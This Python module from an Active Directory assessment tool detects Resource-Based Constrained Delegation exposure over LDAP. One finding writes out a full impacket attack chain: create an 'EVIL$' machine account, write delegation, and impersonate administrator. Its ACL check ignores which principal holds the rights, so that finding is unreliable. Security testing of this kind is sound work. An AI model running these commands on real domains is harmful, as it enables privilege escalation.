"""RBCD Attack — Resource-Based Constrained Delegation abuse."""
from __future__ import annotations
import struct, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"

class RbcdAttack(BaseModule):
    NAME = "rbcd_attack"
    DESCRIPTION = "RBCD: detect Resource-Based Constrained Delegation attack surface"
    PHASE = 10
    TAGS = ["delegation", "rbcd", "privesc"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        dc_ip = self.config.extra.get("dc", self.config.target)
        domain = self.config.extra.get("domain", "")
        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        client = LdapClient(dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
            nt_hash=self.config.extra.get("hash", ""))
        if not client.connect(): return self._make_result(start)

        try:
            # Check 1: Find computers with msDS-AllowedToActOnBehalfOfOtherIdentity already set
            await self.rate_limit()
            rbcd_set = client.search(
                "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))",
                ["sAMAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"])

            if rbcd_set:
                ev = Evidence(extra={"computers": [str(c.get("sAMAccountName", "?")) for c in rbcd_set[:20]]})
                self.new_finding(
                    title=f"Existing RBCD Configurations — {len(rbcd_set)} computers",
                    severity=Severity.MEDIUM,
                    description=(
                        f"{len(rbcd_set)} computer(s) have RBCD configured "
                        "(msDS-AllowedToActOnBehalfOfOtherIdentity):\n"
                        + "\n".join(f"  {str(c.get('sAMAccountName', '?'))}" for c in rbcd_set[:10])
                        + "\n\nReview for unauthorized RBCD delegation."
                    ),
                    reproduction_steps=["Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'}"],
                    remediation="Audit RBCD configurations. Remove unauthorized entries.",
                    references=["MITRE T1550"],
                    evidence=ev,
                    cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
                    cvss_v40_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
                    target=dc_ip)

            # Check 2: Can current user write msDS-AllowedToActOnBehalfOfOtherIdentity?
            # Need GenericAll/GenericWrite/WriteProperty on target computers
            await self.rate_limit()
            targets = client.search(
                "(objectCategory=computer)",
                ["sAMAccountName", "nTSecurityDescriptor", "dNSHostName"])

            GENERIC_ALL = 0x10000000
            GENERIC_WRITE = 0x40000000
            writable = []

            for comp in targets[:100]:
                name = str(comp.get("sAMAccountName", "?"))
                sd = comp.get("nTSecurityDescriptor")
                if not sd or not isinstance(sd, bytes) or len(sd) < 20:
                    continue
                try:
                    offset_dacl = struct.unpack("<I", sd[16:20])[0]
                    if offset_dacl == 0 or offset_dacl >= len(sd): continue
                    acl = sd[offset_dacl:]
                    if len(acl) < 8: continue
                    ace_count = struct.unpack("<H", acl[4:6])[0]
                    pos = 8
                    for _ in range(min(ace_count, 100)):
                        if pos + 8 > len(acl): break
                        ace_type = acl[pos]
                        ace_size = struct.unpack("<H", acl[pos+2:pos+4])[0]
                        if ace_size < 4 or pos + ace_size > len(acl): break
                        if ace_type == 0:
                            mask = struct.unpack("<I", acl[pos+4:pos+8])[0]
                            if mask & (GENERIC_ALL | GENERIC_WRITE):
                                writable.append(name)
                                break
                        pos += ace_size
                except Exception:
                    pass

            if writable:
                ev = Evidence(extra={"writable_computers": writable[:20]})
                self.new_finding(
                    title=f"RBCD Attack Surface — {len(writable)} computers writable",
                    severity=Severity.HIGH,
                    description=(
                        f"Current user can write msDS-AllowedToActOnBehalfOfOtherIdentity on "
                        f"{len(writable)} computer(s): {', '.join(writable[:10])}\n\n"
                        "Attack chain:\n"
                        "1. Create a machine account (or use existing controlled account)\n"
                        "2. Set RBCD on target to allow impersonation via our machine account\n"
                        "3. Request S4U2Self + S4U2Proxy ticket as admin → full access"
                    ),
                    reproduction_steps=[
                        f"# Add machine account:",
                        f"impacket-addcomputer {domain}/user:pass -computer-name EVIL$ -computer-pass Pass",
                        f"# Set RBCD:",
                        f"impacket-rbcd {domain}/user:pass -delegate-to {writable[0]} -delegate-from EVIL$ -action write -dc-ip {dc_ip}",
                        f"# Get service ticket:",
                        f"impacket-getST {domain}/EVIL$:Pass -spn cifs/{writable[0]} -impersonate administrator -dc-ip {dc_ip}",
                    ],
                    remediation="Remove GenericAll/GenericWrite from non-admin principals on computer objects.",
                    references=["CWE-284", "MITRE T1550"],
                    evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40,
                    mitre_attack=["TA0008/T1550"],
                    target=dc_ip)

            # Check 3: Can users create new machine accounts? (MachineAccountQuota > 0)
            await self.rate_limit()
            domain_obj = client.search(
                "(objectClass=domain)", ["ms-DS-MachineAccountQuota"])
            if domain_obj:
                maq = int(str(domain_obj[0].get("ms-DS-MachineAccountQuota", 10) or 10))
                if maq > 0:
                    ev = Evidence(extra={"machine_account_quota": maq})
                    self.new_finding(
                        title=f"MachineAccountQuota = {maq} — users can create computer accounts",
                        severity=Severity.MEDIUM,
                        description=(
                            f"ms-DS-MachineAccountQuota is {maq}. Any authenticated user can "
                            f"create up to {maq} machine accounts, enabling RBCD attacks."
                        ),
                        reproduction_steps=[f"Get-ADObject -Identity '{client.base_dn}' -Properties ms-DS-MachineAccountQuota"],
                        remediation="Set ms-DS-MachineAccountQuota to 0.",
                        references=["CWE-284"],
                        evidence=ev,
                        cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
                        cvss_v40_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
                        target=dc_ip)
        finally:
            client.disconnect()
        return self._make_result(start)

class TestRbcdAttack:
    def test_phase(self) -> None: assert RbcdAttack.PHASE == 10
